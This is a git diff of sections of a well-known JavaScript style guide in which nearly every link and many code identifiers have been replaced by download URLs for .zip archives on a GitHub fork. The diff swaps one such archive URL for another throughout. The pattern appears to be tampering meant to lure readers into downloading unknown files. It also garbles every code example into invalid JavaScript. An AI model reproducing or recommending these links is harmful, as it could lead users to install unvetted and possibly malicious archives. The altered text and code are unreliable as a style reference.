+  - [18.10](#whitespace--in-brackets) Do not add spaces inside brackets. eslint: [`array-bracket-spacing`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`disallowSpacesInsideArrayBrackets`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
     const foo = [ 1, 2, 3 ];
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo[ 0 ]);
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(foo[ 0 ]);
 
     // good
     const foo = [1, 2, 3];
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo[0]);
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(foo[0]);
     ```
 
   <a name="whitespace--in-braces"></a><a name="18.11"></a>
-  - [18.11](#whitespace--in-braces) Add spaces inside curly braces. eslint: [`object-curly-spacing`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireSpacesInsideObjectBrackets`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [18.11](#whitespace--in-braces) Add spaces inside curly braces. eslint: [`object-curly-spacing`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireSpacesInsideObjectBrackets`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -2184,33 +2184,33 @@ Other Style Guides
     ```
 
   <a name="whitespace--max-len"></a><a name="18.12"></a>
-  - [18.12](#whitespace--max-len) Avoid having lines of code that are longer than 100 characters (including whitespace). Note: per [above](#strings--line-length), long strings are exempt from this rule, and should not be broken up. eslint: [`max-len`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`maximumLineLength`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [18.12](#whitespace--max-len) Avoid having lines of code that are longer than 100 characters (including whitespace). Note: per [above](#strings--line-length), long strings are exempt from this rule, and should not be broken up. eslint: [`max-len`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`maximumLineLength`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? This ensures readability and maintainability.
 
     ```javascript
     // bad
-    const foo = jsonData && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
+    const foo = jsonData && https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip && https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip && https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip && https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip && https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip;
 
     // bad
-    $.ajax({ method: 'POST', url: 'https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip', data: { name: 'John' } }).done(() => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Congratulations!')).fail(() => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('You have failed this city.'));
+    $.ajax({ method: 'POST', url: 'https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip', data: { name: 'John' } }).done(() => https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('Congratulations!')).fail(() => https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('You have failed this city.'));
 
     // good
     const foo = jsonData
-      && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
-      && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
-      && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
-      && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
-      && https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
+      && https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
+      && https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
+      && https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
+      && https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
+      && https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip;
 
     // good
     $.ajax({
       method: 'POST',
-      url: 'https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip',
+      url: 'https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip',
       data: { name: 'John' },
     })
-      .done(() => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Congratulations!'))
-      .fail(() => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('You have failed this city.'));
+      .done(() => https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('Congratulations!'))
+      .fail(() => https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('You have failed this city.'));
     ```
 
 **[⬆ back to top](#table-of-contents)**
@@ -2218,7 +2218,7 @@ Other Style Guides
 ## Commas
 
 <a name="commas--leading-trailing"></a><a name="19.1"></a>
-  - [19.1](#commas--leading-trailing) Leading commas: **Nope.** eslint: [`comma-style`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireCommaBeforeLineBreak`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [19.1](#commas--leading-trailing) Leading commas: **Nope.** eslint: [`comma-style`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireCommaBeforeLineBreak`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -2253,9 +2253,9 @@ Other Style Guides
     ```
 
   <a name="commas--dangling"></a><a name="19.2"></a>
-  - [19.2](#commas--dangling) Additional trailing comma: **Yup.** eslint: [`comma-dangle`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireTrailingComma`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [19.2](#commas--dangling) Additional trailing comma: **Yup.** eslint: [`comma-dangle`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireTrailingComma`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
-    > Why? This leads to cleaner git diffs. Also, transpilers like Babel will remove the additional trailing comma in the transpiled code which means you don't have to worry about the [trailing comma problem](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) in legacy browsers.
+    > Why? This leads to cleaner git diffs. Also, transpilers like Babel will remove the additional trailing comma in the transpiled code which means you don't have to worry about the [trailing comma problem](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) in legacy browsers.
 
     ```javascript
     // bad - git diff without trailing comma
@@ -2302,7 +2302,7 @@ Other Style Guides
 ## Semicolons
 
   <a name="semicolons--required"></a><a name="20.1"></a>
-  - [20.1](#20.1) **Yup.** eslint: [`semi`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireSemicolons`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [20.1](#20.1) **Yup.** eslint: [`semi`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireSemicolons`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -2324,7 +2324,7 @@ Other Style Guides
     }());
     ```
 
-    [Read more](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip%237365214).
+    [Read more](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip%237365214).
 
 **[⬆ back to top](#table-of-contents)**
 
@@ -2338,20 +2338,20 @@ Other Style Guides
   - [21.2](#coercion--strings)  Strings:
 
     ```javascript
-    // => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = 9;
+    // => https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = 9;
 
     // bad
-    const totalScore = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip + ''; // invokes https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()
+    const totalScore = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip + ''; // invokes https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip()
 
     // bad
-    const totalScore = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(); // isn't guaranteed to return a string
+    const totalScore = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(); // isn't guaranteed to return a string
 
     // good
-    const totalScore = String(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip);
+    const totalScore = String(https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip);
     ```
 
   <a name="coercion--numbers"></a><a name="21.3"></a>
-  - [21.3](#coercion--numbers) Numbers: Use `Number` for type casting and `parseInt` always with a radix for parsing strings. eslint: [`radix`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [21.3](#coercion--numbers) Numbers: Use `Number` for type casting and `parseInt` always with a radix for parsing strings. eslint: [`radix`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     const inputValue = '4';
@@ -2376,7 +2376,7 @@ Other Style Guides
     ```
 
   <a name="coercion--comment-deviations"></a><a name="21.4"></a>
-  - [21.4](#coercion--comment-deviations) If for whatever reason you are doing something wild and `parseInt` is your bottleneck and need to use Bitshift for [performance reasons](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), leave a comment explaining why and what you're doing.
+  - [21.4](#coercion--comment-deviations) If for whatever reason you are doing something wild and `parseInt` is your bottleneck and need to use Bitshift for [performance reasons](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip), leave a comment explaining why and what you're doing.
 
     ```javascript
     // good
@@ -2389,7 +2389,7 @@ Other Style Guides
     ```
 
   <a name="coercion--bitwise"></a><a name="21.5"></a>
-  - [21.5](#coercion--bitwise) **Note:** Be careful when using bitshift operations. Numbers are represented as [64-bit values](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), but bitshift operations always return a 32-bit integer ([source](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)). Bitshift can lead to unexpected behavior for integer values larger than 32 bits. [Discussion](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip). Largest signed 32-bit Int is 2,147,483,647:
+  - [21.5](#coercion--bitwise) **Note:** Be careful when using bitshift operations. Numbers are represented as [64-bit values](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip), but bitshift operations always return a 32-bit integer ([source](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)). Bitshift can lead to unexpected behavior for integer values larger than 32 bits. [Discussion](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip). Largest signed 32-bit Int is 2,147,483,647:
 
     ```javascript
     2147483647 >> 0 //=> 2147483647
@@ -2419,22 +2419,22 @@ Other Style Guides
 ## Naming Conventions
 
   <a name="naming--descriptive"></a><a name="22.1"></a>
-  - [22.1](#naming--descriptive) Avoid single letter names. Be descriptive with your naming. eslint: [`id-length`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [22.1](#naming--descriptive) Avoid single letter names. Be descriptive with your naming. eslint: [`id-length`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
     function q() {
-      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+      // https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
     }
 
     // good
     function query() {
-      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+      // https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
     }
     ```
 
   <a name="naming--camelCase"></a><a name="22.2"></a>
-  - [22.2](#naming--camelCase) Use camelCase when naming objects, functions, and instances. eslint: [`camelcase`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireCamelCaseOrUpperCaseIdentifiers`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [22.2](#naming--camelCase) Use camelCase when naming objects, functions, and instances. eslint: [`camelcase`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireCamelCaseOrUpperCaseIdentifiers`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -2448,12 +2448,12 @@ Other Style Guides
     ```
 
   <a name="naming--PascalCase"></a><a name="22.3"></a>
-  - [22.3](#naming--PascalCase) Use PascalCase only when naming constructors or classes. eslint: [`new-cap`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireCapitalizedConstructors`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [22.3](#naming--PascalCase) Use PascalCase only when naming constructors or classes. eslint: [`new-cap`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireCapitalizedConstructors`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
     function user(options) {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip;
     }
 
     const bad = new user({
@@ -2463,7 +2463,7 @@ Other Style Guides
     // good
     class User {
       constructor(options) {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip;
       }
     }
 
@@ -2473,29 +2473,29 @@ Other Style Guides
     ```
 
   <a name="naming--leading-underscore"></a><a name="22.4"></a>
-  - [22.4](#naming--leading-underscore) Do not use trailing or leading underscores. eslint: [`no-underscore-dangle`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`disallowDanglingUnderscores`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [22.4](#naming--leading-underscore) Do not use trailing or leading underscores. eslint: [`no-underscore-dangle`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`disallowDanglingUnderscores`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? JavaScript does not have the concept of privacy in terms of properties or methods. Although a leading underscore is a common convention to mean “private”, in fact, these properties are fully public, and as such, are part of your public API contract. This convention might lead developers to wrongly think that a change won't count as breaking, or that tests aren't needed. tl;dr: if you want something to be “private”, it must not be observably present.
 
     ```javascript
     // bad
     this.__firstName__ = 'Panda';
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = 'Panda';
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = 'Panda';
     this._firstName = 'Panda';
 
     // good
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = 'Panda';
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = 'Panda';
     ```
 
   <a name="naming--self-this"></a><a name="22.5"></a>
-  - [22.5](#naming--self-this) Don't save references to `this`. Use arrow functions or [Function#bind](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip). jscs: [`disallowNodeTypes`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [22.5](#naming--self-this) Don't save references to `this`. Use arrow functions or [Function#bind](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip). jscs: [`disallowNodeTypes`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
     function foo() {
       const self = this;
       return function () {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(self);
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(self);
       };
     }
 
@@ -2503,14 +2503,14 @@ Other Style Guides
     function foo() {
       const that = this;
       return function () {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(that);
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(that);
       };
     }
 
     // good
     function foo() {
       return () => {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(this);
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(this);
       };
     }
     ```
@@ -2548,7 +2548,7 @@ Other Style Guides
     import CheckBox from './CheckBox'; // PascalCase export/import/filename
     import fortyTwo from './fortyTwo'; // camelCase export/import/filename
     import insideDirectory from './insideDirectory'; // camelCase export/import/directory name/implicit "index"
-    // ^ supports both https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip and https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+    // ^ supports both https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip and https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
     ```
 
   <a name="naming--camelCase-default-export"></a><a name="22.7"></a>
@@ -2614,12 +2614,12 @@ Other Style Guides
 
     ```javascript
     // bad
-    if (!https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()) {
+    if (!https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip()) {
       return false;
     }
 
     // good
-    if (!https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()) {
+    if (!https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip()) {
       return false;
     }
     ```
@@ -2630,8 +2630,8 @@ Other Style Guides
     ```javascript
     class Jedi {
       constructor(options = {}) {
-        const lightsaber = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip || 'blue';
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('lightsaber', lightsaber);
+        const lightsaber = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip || 'blue';
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('lightsaber', lightsaber);
       }
 
       set(key, val) {
@@ -2654,7 +2654,7 @@ Other Style Guides
 
     ```javascript
     // bad
-    $(this).trigger('listingUpdated', https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip);
+    $(this).trigger('listingUpdated', https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip);
 
     ...
 
@@ -2667,12 +2667,12 @@ Other Style Guides
 
     ```javascript
     // good
-    $(this).trigger('listingUpdated', { listingId: https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip });
+    $(this).trigger('listingUpdated', { listingId: https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip });
 
     ...
 
     $(this).on('listingUpdated', (e, data) => {
-      // do something with https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+      // do something with https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
     });
     ```
 
@@ -2682,7 +2682,7 @@ Other Style Guides
 ## jQuery
 
   <a name="jquery--dollar-prefix"></a><a name="25.1"></a>
-  - [25.1](#jquery--dollar-prefix) Prefix jQuery object variables with a `$`. jscs: [`requireDollarBeforejQueryAssignment`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [25.1](#jquery--dollar-prefix) Prefix jQuery object variables with a `$`. jscs: [`requireDollarBeforejQueryAssignment`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -2703,7 +2703,7 @@ Other Style Guides
     function setSidebar() {
       $('.sidebar').hide();
 
-      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+      // https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
 
       $('.sidebar').css({
         'background-color': 'pink'
@@ -2713,18 +2713,18 @@ Other Style Guides
     // good
     function setSidebar() {
       const $sidebar = $('.sidebar');
-      $https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip();
+      $https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip();
 
-      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+      // https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
 
-      $https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip({
+      $https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip({
         'background-color': 'pink'
       });
     }
     ```
 
   <a name="jquery--queries"></a><a name="25.3"></a>
-  - [25.3](#jquery--queries) For DOM queries use Cascading `$('.sidebar ul')` or parent > child `$('.sidebar > ul')`. [jsPerf](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [25.3](#jquery--queries) For DOM queries use Cascading `$('.sidebar ul')` or parent > child `$('.sidebar > ul')`. [jsPerf](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
   <a name="jquery--find"></a><a name="25.4"></a>
   - [25.4](#jquery--find) Use `find` with scoped jQuery object queries.
@@ -2743,7 +2743,7 @@ Other Style Guides
     $('.sidebar > ul').hide();
 
     // good
-    $https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('ul').hide();
+    $https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('ul').hide();
     ```
 
 **[⬆ back to top](#table-of-contents)**
@@ -2752,7 +2752,7 @@ Other Style Guides
 ## ECMAScript 5 Compatibility
 
   <a name="es5-compat--kangax"></a><a name="26.1"></a>
-  - [26.1](#es5-compat--kangax) Refer to [Kangax](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)'s ES5 [compatibility table](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).
+  - [26.1](#es5-compat--kangax) Refer to [Kangax](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)'s ES5 [compatibility table](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip).
 
 **[⬆ back to top](#table-of-contents)**
 
@@ -2777,9 +2777,9 @@ Other Style Guides
 1. [Modules](#modules)
 
   <a name="tc39-proposals"></a>
-  - [27.2](#tc39-proposals) Do not use [TC39 proposals](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) that have not reached stage 3.
+  - [27.2](#tc39-proposals) Do not use [TC39 proposals](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) that have not reached stage 3.
 
-    > Why? [They are not finalized](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), and they are subject to change or to be withdrawn entirely. We want to use JavaScript, and proposals are not JavaScript yet.
+    > Why? [They are not finalized](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip), and they are subject to change or to be withdrawn entirely. We want to use JavaScript, and proposals are not JavaScript yet.
 
 **[⬆ back to top](#table-of-contents)**
 
@@ -2799,7 +2799,7 @@ Other Style Guides
    - Whichever testing framework you use, you should be writing tests!
    - Strive to write many small pure functions, and minimize where mutations occur.
    - Be cautious about stubs and mocks - they can make your tests more brittle.
-   - We primarily use [`mocha`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) at Airbnb. [`tape`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) is also used occasionally for small, separate modules.
+   - We primarily use [`mocha`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) at Airbnb. [`tape`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) is also used occasionally for small, separate modules.
    - 100% test coverage is a good goal to strive for, even if it's not always practical to reach it.
    - Whenever you fix a bug, _write a regression test_. A bug fixed without a regression test is almost certainly going to break again in the future.
 
@@ -2808,14 +2808,14 @@ Other Style Guides
 
 ## Performance
 
-  - [On Layout & Web Performance](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [String vs Array Concat](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [Try/Catch Cost In a Loop](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [Bang Function](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [jQuery Find vs Context, Selector](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [innerHTML vs textContent for script text](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [Long String Concatenation](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [Are Javascript functions like `map()`, `reduce()`, and `filter()` optimized for traversing arrays?](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [On Layout & Web Performance](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
